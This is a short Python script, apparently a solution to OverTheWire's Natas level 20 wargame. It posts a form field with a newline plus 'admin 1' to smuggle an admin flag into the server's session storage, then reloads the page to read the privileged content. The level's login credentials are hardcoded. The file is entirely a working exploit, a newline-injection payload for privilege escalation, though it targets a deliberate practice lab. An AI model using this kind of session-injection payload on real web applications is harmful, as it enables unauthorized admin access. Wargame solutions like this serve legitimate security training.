#!/usr/bin/env python3
import requests

auth_user = 'natas20'
auth_pass = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'
target = 'http://natas20.natas.labs.overthewire.org'

data = {'name':'whatever\nadmin 1'}
s = requests.Session()

# First send our payload (POST)
r1 = s.post(
	target,
	auth=(auth_user, auth_pass),
	data=data
	)

# Refresh page and get content
r2 = s.get(
	target,
	auth=(auth_user, auth_pass),
	)
print(r2.text)
